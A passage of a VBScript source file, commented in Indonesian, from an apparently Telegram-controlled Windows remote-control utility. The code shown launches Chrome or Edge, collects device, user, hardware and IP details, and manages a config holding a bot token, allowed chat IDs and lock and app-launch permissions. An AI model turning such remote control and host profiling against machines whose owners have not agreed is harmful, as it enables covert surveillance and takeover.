      shell.Run Chr(34) & p & Chr(34), 1, False
      OpenChrome = True
      On Error GoTo 0
      Exit Function
    End If
  Next
  shell.Run "cmd.exe /c start """" ""chrome""", 0, False
  If Err.Number = 0 Then OpenChrome = True Else OpenChrome = False
  On Error GoTo 0
End Function

Function OpenChromeWithUrl(u)
  On Error Resume Next
  Dim url: url = Trim(CStr(u))
  If url = "" Then OpenChromeWithUrl = OpenChrome(): Exit Function
  Dim p1, p2, p
  p1 = shell.ExpandEnvironmentStrings("%ProgramFiles%") & "\Google\Chrome\Application\chrome.exe"
  p2 = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Google\Chrome\Application\chrome.exe"
  For Each p In Array(p1, p2)
    If fso.FileExists(p) Then
      shell.Run Chr(34) & p & Chr(34) & " " & Chr(34) & url & Chr(34), 1, False
      OpenChromeWithUrl = True
      On Error GoTo 0
      Exit Function
    End If
  Next
  shell.Run "cmd.exe /c start """" ""chrome"" " & Chr(34) & url & Chr(34), 0, False
  If Err.Number = 0 Then OpenChromeWithUrl = True Else OpenChromeWithUrl = False
  On Error GoTo 0
End Function

Function OpenEdge()
  On Error Resume Next
  Dim p1, p2, p
  p1 = shell.ExpandEnvironmentStrings("%ProgramFiles%") & "\Microsoft\Edge\Application\msedge.exe"
  p2 = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Microsoft\Edge\Application\msedge.exe"
  For Each p In Array(p1, p2)
    If fso.FileExists(p) Then
      shell.Run Chr(34) & p & Chr(34), 1, False
      OpenEdge = True
      On Error GoTo 0
      Exit Function
    End If
  Next
  ' Fallback: coba via PATH
  shell.Run "cmd.exe /c start """" ""msedge""", 0, False
  If Err.Number = 0 Then OpenEdge = True Else OpenEdge = False
  On Error GoTo 0
End Function

Function OpenEdgeWithUrl(u)
  On Error Resume Next
  Dim url: url = Trim(CStr(u))
  If url = "" Then OpenEdgeWithUrl = OpenEdge(): Exit Function
  Dim p1, p2, p
  p1 = shell.ExpandEnvironmentStrings("%ProgramFiles%") & "\Microsoft\Edge\Application\msedge.exe"
  p2 = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Microsoft\Edge\Application\msedge.exe"
  For Each p In Array(p1, p2)
    If fso.FileExists(p) Then
      shell.Run Chr(34) & p & Chr(34) & " " & Chr(34) & url & Chr(34), 1, False
      OpenEdgeWithUrl = True
      On Error GoTo 0
      Exit Function
    End If
  Next
  ' Fallback: protocol handler microsoft-edge:
  shell.Run "cmd.exe /c start """" ""microsoft-edge:" & url & """", 0, False
  If Err.Number = 0 Then OpenEdgeWithUrl = True Else OpenEdgeWithUrl = False
  On Error GoTo 0
End Function

Function GetDeviceDetailsText()
  On Error Resume Next
  Dim net, svc: Set net = CreateObject("WScript.Network"): Set svc = GetObject("winmgmts:\\.\root\cimv2")
  Dim os, osCaption, osVersion, osBuild, osArch, lastBootStr, bootDate
  Dim cs, manufacturer, model, totalMem
  Dim cpu, cpuName, cores, threads, mhz
  Dim sysDrive, dsk, dSize, dFree
  Dim ipText, nic, ip

  For Each os In svc.ExecQuery("SELECT Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime FROM Win32_OperatingSystem")
    osCaption = SafeStr(os.Caption)
    osVersion = SafeStr(os.Version)
    osBuild   = SafeStr(os.BuildNumber)
    osArch    = SafeStr(os.OSArchitecture)
    lastBootStr = SafeStr(os.LastBootUpTime)
    Exit For
  Next
  If osArch = "" Then osArch = shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
  If lastBootStr <> "" Then bootDate = WMIDateStringToDate(lastBootStr)

  For Each cs In svc.ExecQuery("SELECT Manufacturer, Model, TotalPhysicalMemory FROM Win32_ComputerSystem")
    manufacturer = SafeStr(cs.Manufacturer)
    model = SafeStr(cs.Model)
    totalMem = CDbl(0): On Error Resume Next: totalMem = CDbl(cs.TotalPhysicalMemory): On Error GoTo 0
    Exit For
  Next

  For Each cpu In svc.ExecQuery("SELECT Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed FROM Win32_Processor")
    cpuName = SafeStr(cpu.Name)
    cores = 0: threads = 0: mhz = 0
    On Error Resume Next
    cores = CLng(cpu.NumberOfCores): threads = CLng(cpu.NumberOfLogicalProcessors): mhz = CLng(cpu.MaxClockSpeed)
    On Error GoTo 0
    Exit For
  Next

  sysDrive = shell.ExpandEnvironmentStrings("%SystemDrive%")
  For Each dsk In svc.ExecQuery("SELECT Size, FreeSpace FROM Win32_LogicalDisk WHERE DeviceID='" & sysDrive & "'")
    On Error Resume Next
    dSize = CDbl(dsk.Size): dFree = CDbl(dsk.FreeSpace)
    On Error GoTo 0
    Exit For
  Next

  ipText = ""
  For Each nic In svc.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
    If IsArray(nic.IPAddress) Then
      For Each ip In nic.IPAddress
        If InStr(CStr(ip), ":") = 0 Then ' IPv4 saja
          If ipText <> "" Then ipText = ipText & ", "
          ipText = ipText & CStr(ip)
        End If
      Next
    End If
  Next
  If ipText = "" Then ipText = "(tidak ada/terputus)"

  Dim uptimeStr
  If IsDate(bootDate) Then uptimeStr = FormatUptime(bootDate) Else uptimeStr = "(tidak diketahui)"

  Dim info
  info = "Nama Perangkat: " & net.ComputerName & vbCrLf & _
         "Pengguna: " & net.UserDomain & "\" & net.UserName & vbCrLf & _
         "Pabrikan/Model: " & manufacturer & " / " & model & vbCrLf & _
         "OS: " & osCaption & " " & osVersion & " (Build " & osBuild & ", " & osArch & ")" & vbCrLf & _
         "Last Boot: " & IIfVB(IsDate(bootDate), (FormatDateTime(bootDate, vbLongDate) & " " & FormatDateTime(bootDate, vbLongTime)), "(tidak diketahui)") & vbCrLf & _
         "Uptime: " & uptimeStr & vbCrLf & _
         "CPU: " & cpuName & IIfVB(cores>0 Or threads>0 Or mhz>0, " (" & cores & " cores, " & threads & " threads, " & mhz & " MHz)", "") & vbCrLf & _
         "RAM: " & IIfVB(totalMem>0, FormatBytes(totalMem), "(tidak diketahui)") & vbCrLf & _
         "Disk " & sysDrive & ": " & IIfVB(dSize>0, (FormatBytes(dFree) & " free dari " & FormatBytes(dSize)), "(tidak diketahui)") & vbCrLf & _
         "IP: " & ipText

  GetDeviceDetailsText = info
  On Error GoTo 0
End Function


' ===== App Config =====
Sub LoadCfg(ensureFolder)
  If ensureFolder Then If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR
  TELEGRAM_TOKEN = "": LAST_CHAT_ID = ""
  ALLOWED_CHAT_IDS = "": TAMPER_PROTECT = 0: SCRIPT_HASH = "": CONTROL_CODE = "": ALLOW_LOCK = 1: ALLOW_OPEN_APPS = 1
  APP_MODE = "standalone"
  If fso.FileExists(CFG_PATH) Then
    Dim t, content, lines, i, line, eq, key, val
    Set t = fso.OpenTextFile(CFG_PATH, 1, False)
    content = t.ReadAll: t.Close
    lines = Split(content, vbCrLf)
    For i = 0 To UBound(lines)
      line = Trim(lines(i))
      If Len(line) > 0 Then
        If Not (Left(line,1) = ";" Or Left(line,1) = "#") Then
          eq = InStr(1, line, "=")
          If eq > 0 Then
            key = Trim(Left(line, eq-1))
            val = Trim(Mid(line, eq+1))
            Select Case LCase(key)
              Case "token": TELEGRAM_TOKEN = val
              Case "last_chat_id": LAST_CHAT_ID = val
              Case "allowed_chat_ids": ALLOWED_CHAT_IDS = val
              Case "tamper_protect": On Error Resume Next: TAMPER_PROTECT = CLng(val): On Error GoTo 0
              Case "script_hash": SCRIPT_HASH = val
              Case "control_code": CONTROL_CODE = val
              Case "allow_lock": On Error Resume Next: ALLOW_LOCK = CLng(val): On Error GoTo 0
              Case "allow_open_apps": On Error Resume Next: ALLOW_OPEN_APPS = CLng(val): On Error GoTo 0
              Case "last_offset": On Error Resume Next: LAST_OFFSET = CLng(val): On Error GoTo 0
              Case "mode":
                Dim mv: mv = LCase(Trim(val))
                If mv = "server" Or mv = "client" Then
                  APP_MODE = mv
                Else
                  APP_MODE = "standalone"
                End If
              ' mode/server/script/auto_update dihapus
              ' ws_* removed
            End Select
          End If
        End If
      End If
    Next
  End If
  ' Overlay dari edit.ini (jika ada) untuk memudahkan pengeditan manual tanpa bentrok penulisan otomatis
  If fso.FileExists(EDIT_CFG_PATH) Then
    Dim te, contente, linese, ie, linee, eqe, keye, vale
    Set te = fso.OpenTextFile(EDIT_CFG_PATH, 1, False)
    contente = te.ReadAll: te.Close
    linese = Split(contente, vbCrLf)
    For ie = 0 To UBound(linese)
      linee = Trim(linese(ie))
      If Len(linee) > 0 Then
        If Not (Left(linee,1) = ";" Or Left(linee,1) = "#") Then
          eqe = InStr(1, linee, "=")
          If eqe > 0 Then
            keye = Trim(Left(linee, eqe-1))
            vale = Trim(Mid(linee, eqe+1))
            Select Case LCase(keye)
              Case "token": TELEGRAM_TOKEN = vale
              Case "last_chat_id": LAST_CHAT_ID = vale
              Case "allowed_chat_ids": ALLOWED_CHAT_IDS = vale
              Case "tamper_protect": On Error Resume Next: TAMPER_PROTECT = CLng(vale): On Error GoTo 0
              Case "script_hash": SCRIPT_HASH = vale
              Case "control_code": CONTROL_CODE = vale
              Case "allow_lock": On Error Resume Next: ALLOW_LOCK = CLng(vale): On Error GoTo 0
              Case "allow_open_apps": On Error Resume Next: ALLOW_OPEN_APPS = CLng(vale): On Error GoTo 0
              Case "last_offset": On Error Resume Next: LAST_OFFSET = CLng(vale): On Error GoTo 0
              Case "mode":
                Dim mve: mve = LCase(Trim(vale))
                If mve = "server" Or mve = "client" Then
                  APP_MODE = mve
                Else
                  APP_MODE = "standalone"
                End If
              ' mode/server/script/auto_update dihapus
            End Select
          End If
        End If
      End If
    Next
  End If
End Sub

Sub SaveCfg()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR
  Dim baseCfg : Set baseCfg = ReadIniToDict(CFG_PATH)
  Dim overlay : Set overlay = ReadIniToDict(EDIT_CFG_PATH)
  Dim content: content = ComposeCfgContentRespectOverlay(baseCfg, overlay)
  ' Tulis atomik: ke file temp lalu rename
  Call WriteTextAtomicWithBackup(CFG_PATH, content)
  ' Hapus sisa backup config.ini jika ada
  On Error Resume Next: If fso.FileExists(CFG_PATH & ".bak") Then fso.DeleteFile CFG_PATH & ".bak", True: On Error GoTo 0
  On Error GoTo 0

End Sub

 ' dibersihkan: ComposeCfgContent tidak dipakai lagi (diganti oleh ComposeCfgContentRespectOverlay)

' ===== Robust IO helpers =====

' Baca file INI sederhana menjadi dictionary key->value (lowercase key).
Function ReadIniToDict(path)
  On Error Resume Next
  Dim d: Set d = CreateObject("Scripting.Dictionary")
  If fso.FileExists(path) Then
    Dim t, content, lines, i, line, eq, key, val
    Set t = fso.OpenTextFile(path, 1, False)
    content = t.ReadAll: t.Close
    lines = Split(content, vbCrLf)
    For i = 0 To UBound(lines)
      line = Trim(lines(i))
      If Len(line) > 0 Then
        If Not (Left(line,1) = ";" Or Left(line,1) = "#") Then
          eq = InStr(1, line, "=")
          If eq > 0 Then
            key = LCase(Trim(Left(line, eq-1)))
            val = Trim(Mid(line, eq+1))
            If d.Exists(key) Then
              d(key) = val
            Else
              d.Add key, val
            End If
          End If
        End If
      End If
    Next
  End If
  Set ReadIniToDict = d
  On Error GoTo 0
End Function

' Nilai default untuk setiap key config (dipakai saat overlay ada tapi base belum punya key tersebut).
Function GetDefaultCfgValue(k)
  Select Case LCase(Trim(CStr(k)))
    Case "token":           GetDefaultCfgValue = ""
    Case "last_chat_id":    GetDefaultCfgValue = ""
    Case "allowed_chat_ids":GetDefaultCfgValue = ""
    Case "tamper_protect":  GetDefaultCfgValue = "0"
    Case "script_hash":     GetDefaultCfgValue = ""
    Case "control_code":    GetDefaultCfgValue = ""
    Case "allow_lock":      GetDefaultCfgValue = "1"
    Case "allow_open_apps": GetDefaultCfgValue = "1"
    Case "last_offset":     GetDefaultCfgValue = "0"
    Case "mode":            GetDefaultCfgValue = "standalone"
    ' kunci website dihapus
    Case Else:               GetDefaultCfgValue = ""
  End Select
End Function

' Ambil nilai variabel runtime untuk key tertentu.
Function GetCurrentCfgValue(k)
  Select Case LCase(Trim(CStr(k)))
    Case "token":           GetCurrentCfgValue = TELEGRAM_TOKEN
    Case "last_chat_id":    GetCurrentCfgValue = LAST_CHAT_ID
    Case "allowed_chat_ids":GetCurrentCfgValue = ALLOWED_CHAT_IDS
    Case "tamper_protect":  GetCurrentCfgValue = CStr(TAMPER_PROTECT)
    Case "script_hash":     GetCurrentCfgValue = SCRIPT_HASH
    Case "control_code":    GetCurrentCfgValue = CONTROL_CODE
    Case "allow_lock":      GetCurrentCfgValue = CStr(ALLOW_LOCK)
    Case "allow_open_apps": GetCurrentCfgValue = CStr(ALLOW_OPEN_APPS)
    Case "last_offset":     GetCurrentCfgValue = CStr(LAST_OFFSET)
    Case "mode":            GetCurrentCfgValue = APP_MODE
    ' kunci website dihapus
    Case Else:               GetCurrentCfgValue = ""
  End Select
End Function

' Susun konten config.ini dengan menghormati pemisahan overlay: key yang ada di edit.ini
' tidak akan ditulis dari nilai runtime (agar tidak menyatu ke config.ini).
Function ComposeCfgContentRespectOverlay(baseCfg, overlayKeys)
  Dim keys, i, k, v, out
  keys = Array(_
    "token","last_chat_id","allowed_chat_ids","tamper_protect","script_hash","control_code",_
    "allow_lock","allow_open_apps","last_offset","mode")
  out = ""
  For i = 0 To UBound(keys)
    k = keys(i)
    If overlayKeys.Exists(k) Then
      If baseCfg.Exists(k) Then
        v = baseCfg(k)
      Else
        v = GetDefaultCfgValue(k)
      End If
    Else
      v = GetCurrentCfgValue(k)
    End If
    If i > 0 Then out = out & vbCrLf
    out = out & k & "=" & CStr(v)
  Next
  ComposeCfgContentRespectOverlay = out
End Function

 ' EnsureEditCfgExists dihapus (overlay opsional)

Function WriteTextAtomicWithBackup(path, text)
  On Error Resume Next
  WriteTextAtomicWithBackup = False
  Dim folder, tmp, bak
  folder = fso.GetParentFolderName(path)
  If folder = "" Then folder = APP_DIR
  If Not fso.FolderExists(folder) Then fso.CreateFolder folder
  tmp = path & ".tmp"
  bak = path & ".bak"
  Dim isConfig: isConfig = (LCase(Right(CStr(path), 10)) = "config.ini")
  ' tulis ke file tmp terlebih dahulu
  Dim t: Set t = fso.CreateTextFile(tmp, True)
  t.Write CStr(text): t.Close
  If Not fso.FileExists(tmp) Then Exit Function
  If fso.GetFile(tmp).Size = 0 Then fso.DeleteFile tmp, True: Exit Function
  ' backup lama jika ada (kecuali config.ini diminta tanpa sisa)
  If Not isConfig Then
    If fso.FileExists(path) Then On Error Resume Next: fso.CopyFile path, bak, True: On Error GoTo 0
  End If
  ' ganti file utama
  On Error Resume Next
  If fso.FileExists(path) Then fso.DeleteFile path, True
  fso.MoveFile tmp, path
  If Err.Number <> 0 Then
    Err.Clear
    ' fallback: tulis langsung
    Dim tt: Set tt = fso.OpenTextFile(path, 2, True)
    If Not (tt Is Nothing) Then tt.Write CStr(text): tt.Close
  End If
  ' verifikasi
  On Error Resume Next
  If fso.FileExists(path) Then If fso.GetFile(path).Size > 0 Then WriteTextAtomicWithBackup = True Else WriteTextAtomicWithBackup = False
  If fso.FileExists(tmp) Then On Error Resume Next: fso.DeleteFile tmp, True: On Error GoTo 0
  ' hapus backup config.ini jika ada (tanpa sisa)
  If isConfig Then On Error Resume Next: If fso.FileExists(bak) Then fso.DeleteFile bak, True: On Error GoTo 0
  On Error GoTo 0
End Function
 ' EnsureConfigDefaults dihapus (fitur website dihilangkan)
' StopAnyServerProc dihapus
 ' Pembersihan artefak server dan enforce mode client dihapus
